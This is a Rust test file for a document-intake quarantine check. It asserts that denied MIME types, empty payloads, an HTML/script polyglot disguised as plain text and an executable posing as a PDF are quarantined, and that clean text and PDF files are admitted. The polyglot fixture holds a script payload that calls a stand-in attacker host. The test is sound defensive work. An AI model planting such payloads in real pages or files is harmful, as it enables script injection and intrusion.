//! Adapted from `crates/medscale-core/tests/hostile_mime_010.rs` (`ADM-0007`, `T12`); see `PROVENANCE.md`.

use safeevidence_contracts::document_intake::{
    DocumentDenyReason, DocumentIntakeRequest, DocumentMimeClass, QuarantineDecision, mime_decision,
};

#[test]
fn denied_mime_classes_quarantine() {
    for mime in [
        DocumentMimeClass::ApplicationOctetStream,
        DocumentMimeClass::TextHtml,
        DocumentMimeClass::OfficeOpenXml,
        DocumentMimeClass::ApplicationJavascript,
        DocumentMimeClass::Unknown,
    ] {
        let req = DocumentIntakeRequest {
            mime,
            bytes: b"hostile".to_vec(),
            fixture_id: Some("hostile".to_owned()),
        };
        let (decision, reason) = mime_decision(&req);
        assert_eq!(decision, QuarantineDecision::Quarantine);
        assert_eq!(reason, DocumentDenyReason::MimeDenied);
    }
}

#[test]
fn empty_and_spoofed_magic_payloads_quarantine() {
    let empty = DocumentIntakeRequest {
        mime: DocumentMimeClass::TextPlain,
        bytes: vec![],
        fixture_id: None,
    };
    assert_eq!(
        mime_decision(&empty),
        (
            QuarantineDecision::Quarantine,
            DocumentDenyReason::EmptyPayload
        )
    );

    // HTML/script polyglot disguised as text/plain is quarantined.
    let polyglot = DocumentIntakeRequest {
        mime: DocumentMimeClass::TextPlain,
        bytes: b"  <script>fetch('http://evil.invalid')</script>".to_vec(),
        fixture_id: Some("html-polyglot".to_owned()),
    };
    assert_eq!(
        mime_decision(&polyglot),
        (
            QuarantineDecision::Quarantine,
            DocumentDenyReason::MimeDenied
        )
    );

    // Non-PDF bytes declared as ApplicationPdf are quarantined on magic-header mismatch.
    let fake_pdf = DocumentIntakeRequest {
        mime: DocumentMimeClass::ApplicationPdf,
        bytes: b"MZ\x90\x00executable-pretending-to-be-pdf".to_vec(),
        fixture_id: Some("fake-pdf".to_owned()),
    };
    assert_eq!(
        mime_decision(&fake_pdf),
        (
            QuarantineDecision::Quarantine,
            DocumentDenyReason::MagicHeaderMismatch
        )
    );

    // Valid bounded UTF-8 text and %PDF- header pass intake quarantine.
    let clean_text = DocumentIntakeRequest {
        mime: DocumentMimeClass::TextPlain,
        bytes: b"Synthetic study report abstract.".to_vec(),
        fixture_id: Some("clean-txt".to_owned()),
    };
    assert_eq!(
        mime_decision(&clean_text),
        (
            QuarantineDecision::AdmitToSandboxedParser,
            DocumentDenyReason::None
        )
    );

    let clean_pdf = DocumentIntakeRequest {
        mime: DocumentMimeClass::ApplicationPdf,
        bytes: b"%PDF-1.7\n%synthetic".to_vec(),
        fixture_id: Some("clean-pdf".to_owned()),
    };
    assert_eq!(
        mime_decision(&clean_pdf),
        (
            QuarantineDecision::AdmitToSandboxedParser,
            DocumentDenyReason::None
        )
    );
}
